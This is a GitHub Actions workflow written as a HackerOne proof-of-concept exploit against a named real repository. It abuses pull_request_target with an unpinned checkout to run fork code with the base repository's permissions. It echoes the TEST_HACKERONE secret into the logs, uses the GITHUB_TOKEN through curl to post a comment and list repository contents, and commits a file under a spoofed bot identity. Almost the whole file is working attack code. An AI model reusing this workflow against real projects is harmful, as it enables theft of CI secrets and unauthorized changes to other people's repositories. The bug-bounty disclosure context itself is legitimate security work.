name: Exploit pull_request_target
run-name: "ðŸš¨ HackerOne POC Exploit"

on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
      issues: write
      
    steps:
      - name: Checkout attacker code (exploits the vulnerability!)
        uses: actions/checkout@v4
        # NO ref specified = checks out PR code with base repo permissions!
        
      - name: Execute malicious code with base repo token
        run: |
          echo "=== ðŸš¨ EXPLOIT SUCCESSFUL! ðŸš¨ ==="
          echo "Running in BASE REPO context: svavacapital/svava-terraform-github-actions"
          echo "With PR code from: ${{ github.event.pull_request.head.repo.full_name }}"
          echo ""
          
          # PROOF 1: Access their TEST_HACKERONE secret
          echo "ðŸ”“ STEP 1: Stealing secret 'TEST_HACKERONE'"
          echo "TEST_HACKERONE secret value: '${{ secrets.TEST_HACKERONE }}'"
          
          # PROOF 2: Use GITHUB_TOKEN to create comment as base repo
          echo ""
          echo "ðŸ”“ STEP 2: Using GITHUB_TOKEN to create comment as svavacapital"
          
          COMMENT_BODY=$(cat << 'EOF'
          ### ðŸš¨ SECURITY POC EXPLOIT SUCCESSFUL ðŸš¨
          
          **This comment was created via `pull_request_target` exploit!**
          
          **Proofs:**
          1. âœ… Executed code from fork with base repo permissions
          2. âœ… Accessed base repo secrets
          3. âœ… Using base repo GITHUB_TOKEN
          4. âœ… Running as svavacapital/svava-terraform-github-actions
          
          **Vulnerability:** `pull_request_target` + `actions/checkout` without `ref`
          
          **Impact:** Fork PRs can execute arbitrary code with base repo permissions.
          EOF
          )
          
          # Create comment using base repo GITHUB_TOKEN
          curl -X POST \
            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github.v3+json" \
            "https://api.github.com/repos/svavacapital/svava-terraform-github-actions/issues/${{ github.event.pull_request.number }}/comments" \
            -d "{\"body\":\"$COMMENT_BODY\"}"
          
          echo "âœ… Comment created as svavacapital!"
          
          # PROOF 3: Show we have base repo GITHUB_TOKEN
          echo ""
          echo "ðŸ”“ STEP 3: Demonstrating GITHUB_TOKEN access"
          echo "GITHUB_TOKEN exists: ${{ secrets.GITHUB_TOKEN != '' }}"
          echo "Token preview: ${GITHUB_TOKEN:0:15}..."
          
          # PROOF 4: List repository contents (prove we have access)
          echo ""
          echo "ðŸ”“ STEP 4: Listing repository contents via API"
          curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
            "https://api.github.com/repos/svavacapital/svava-terraform-github-actions/contents" \
            | jq -r '.[].name' | head -10
          
          # PROOF 5: Create a file in the repository
          echo ""
          echo "ðŸ”“ STEP 5: Creating proof file in repository"
          echo "HACKERONE_POC_EXPLOITED: $(date)" > exploited-poc.txt
          git config user.name "svavacapital[bot]"
          git config user.email "svavacapital[bot]@users.noreply.github.com"
          git add exploited-poc.txt
          git commit -m "HackerOne POC: Exploit via pull_request_target" || echo "Commit may fail (expected)"
          
          echo ""
          echo "=== ðŸ“Š POC SUMMARY ==="
          echo "âœ… Secret accessed: TEST_HACKERONE='${{ secrets.TEST_HACKERONE }}'"
          echo "âœ… Comment created as svavacapital"
          echo "âœ… Repository accessed with GITHUB_TOKEN"
          echo "âœ… Code executed from fork with base repo permissions"
          echo ""
          echo "ðŸ”´ VULNERABILITY CONFIRMED: pull_request_target is INSECURE!"
          
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TEST_HACKERONE: ${{ secrets.TEST_HACKERONE }}
